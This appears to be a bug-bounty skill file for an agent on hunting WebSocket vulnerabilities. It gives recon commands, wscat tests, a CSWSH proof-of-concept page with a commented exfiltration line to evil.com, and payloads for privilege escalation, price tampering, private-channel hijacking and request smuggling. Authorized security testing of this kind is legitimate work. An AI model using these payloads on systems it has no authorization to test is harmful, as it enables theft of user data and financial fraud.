---
name: hunt-websocket
description: Hunt WebSocket vulnerabilities — Cross-Site WebSocket Hijacking (CSWSH), missing authentication on WS handshake, message tampering, event authorization bypass, WS→HTTP request smuggling. Use when target has WebSocket endpoints (ws:// or wss://), real-time features, chat, live dashboard, or trading platforms.
sources: hackerone_public, portswigger_research
report_count: 11
---

# HUNT-WEBSOCKET — WebSocket Security

## Crown Jewel Targets

CSWSH (Cross-Site WebSocket Hijacking) without CSRF token = High (session data theft from any user).

**Highest-value chains:**
- **CSWSH → data exfil** — WS handshake uses cookies but no CSRF token → attacker page initiates WS as victim → receives real-time stream of victim's messages/data
- **No auth on WS messages** — HTTP auth present but WS messages not re-validated per-message → send privileged messages without auth
- **WS message tampering** — modify in-flight messages (price, user ID, amount) in real-time trading/financial apps
- **WS→HTTP smuggling** — malformed WebSocket frames confuse HTTP/1.1 reverse proxies → request smuggling
- **Event authorization bypass** — subscribe to channels/rooms for other users without permission check

---

## Phase 1 — Discover WebSocket Endpoints

```bash
# Grep JS files for WebSocket connections
grep -r "new WebSocket\|io.connect\|socket.io\|ws://" recon/$TARGET/ --include="*.js" 2>/dev/null | \
  grep -oE "(wss?://[^'\"]+|/[a-zA-Z0-9/_-]+socket[^'\"]*)" | sort -u

# Look for socket.io or WS endpoints in crawl
cat recon/$TARGET/urls.txt | grep -iE "socket|ws\b|websocket|stream|realtime|live|chat|events"

# HTTP upgrade headers
curl -sI https://$TARGET/ws 2>/dev/null | grep -i "upgrade\|websocket"
curl -sI https://$TARGET/socket.io/ 2>/dev/null | grep -i "upgrade"

# Port scan for non-standard WS ports
nmap -sV -p 8080,8443,9000,3000,3001 $TARGET 2>/dev/null | grep "open"
```

---

## Phase 2 — CSWSH (Cross-Site WebSocket Hijacking)

```bash
# Step 1: Check if WS handshake uses cookies for auth (no CSRF token)
# Open target in browser → DevTools → Network → WS tab
# Check handshake headers — if only Cookie: session=X → CSWSH candidate

# Step 2: Check if Origin header is validated
# Test with wrong origin
wscat -c "wss://$TARGET/ws" \
  --header "Origin: https://evil.com" \
  --header "Cookie: session=YOUR_SESSION"
# If connection accepted from evil.com origin → CSWSH confirmed

# Step 3: PoC HTML (host on evil.com, open while victim is logged in)
cat > /tmp/cswsh-poc.html << 'EOF'
<html><body>
<pre id="out"></pre>
<script>
var ws = new WebSocket("wss://TARGET/ws");
ws.onopen = function() {
  document.getElementById("out").textContent += "[+] Connected (as victim via CSWSH)\n";
  ws.send(JSON.stringify({type: "subscribe", channel: "user_notifications"}));
};
ws.onmessage = function(e) {
  document.getElementById("out").textContent += "MSG: " + e.data + "\n";
  // Exfil to attacker:
  // fetch("https://evil.com/log?d=" + encodeURIComponent(e.data));
};
ws.onerror = function(e) {
  document.getElementById("out").textContent += "ERR: " + e + "\n";
};
</script>
</body></html>
EOF
```

---

## Phase 3 — Missing Authentication on WS Messages

```bash
# Connect to WS without a session cookie
wscat -c "wss://$TARGET/ws"
# Send messages — do they get processed?
# {"type": "getUserData", "userId": 1}
# {"type": "getAdminPanel"}

# Connect with low-priv session, send high-priv messages
wscat -c "wss://$TARGET/ws" --header "Cookie: session=LOW_PRIV_SESSION"
# Then send admin action:
# {"action": "deleteUser", "userId": 999}
# {"action": "getSecretConfig"}
```

---

## Phase 4 — Message Tampering (Financial/Game targets)

```bash
# Intercept WS messages with Burp Suite (Proxy → WebSockets history)
# Modify in-transit:
# {"price": 100} → {"price": 0.01}
# {"amount": 1} → {"amount": 9999}
# {"userId": 123} → {"userId": 1} (admin)

# With wscat — replay modified messages
wscat -c "wss://$TARGET/trade" --header "Cookie: session=SESSION"
# Then type: {"action":"buy","amount":1,"price":0.01}
```

---

## Phase 5 — Event / Channel Authorization Bypass

```bash
# Socket.io room join without permission check
# Connect and subscribe to other users' private channels
wscat -c "wss://$TARGET/socket.io/?EIO=4&transport=websocket" \
  --header "Cookie: session=YOUR_SESSION"
# After connect, send:
# 42["join", {"room": "user_999_private"}]
# 42["subscribe", {"channel": "admin_events"}]

# Check if server rejects or accepts the subscription
# If accepted → receive other users' real-time events
```

---

## Phase 6 — WS → HTTP Request Smuggling

```bash
# Test with malformed WS frames that confuse reverse proxies
# Requires Burp Suite Pro with HTTP Request Smuggler extension

# Manual test: send HTTP request headers inside WS frame data
wscat -c "wss://$TARGET/ws" --header "Cookie: session=SESSION"
# Send: "GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
# If proxy interprets as HTTP request → smuggling possible
```

---

## Phase 7 — Socket.io Specific Checks

```bash
# Check socket.io version (older versions have auth bypass)
curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling" | head -5

# Namespace enumeration
# Default: /
# Try: /admin, /internal, /api, /dashboard
wscat -c "wss://$TARGET/socket.io/?EIO=4&transport=websocket&nsp=/admin"

# Room/namespace without auth
curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling&sid=FAKE"

# Check if handshake token is validated
curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling" | \
  python3 -c "import sys,json; d=sys.stdin.read(); print(d)"
```

---

## Tools

```bash
# wscat — WebSocket CLI client
npm install -g wscat
wscat -c "wss://target.com/ws" --header "Cookie: session=TOKEN"

# websocat — alternative WS client
brew install websocat
websocat "wss://target.com/ws" --header "Cookie: session=TOKEN"

# Burp Suite — WebSockets history tab for intercept/replay/tamper
# Pwncat for WS → HTTP smuggling tests
```

---

## Chain Table

| WS finding | Chain to | Impact |
|-----------|----------|--------|
| CSWSH confirmed | Subscribe to victim's channels | Real-time data theft |
| No per-message auth | Send admin actions | Privilege escalation |
| Message tampering | Modify prices/amounts | Financial fraud |
| Channel auth bypass | Subscribe other users' private rooms | Mass data exfil |

---

## Validation

✅ CSWSH: PoC HTML on evil.com receives victim's WS messages via browser auto-send cookies
✅ No auth: WS message processed without valid session
✅ Channel bypass: received messages from another user's private channel

**Severity:**
- CSWSH → session data theft: High
- No auth on admin WS actions: Critical
- Financial message tampering: Critical
- Channel subscription bypass: High
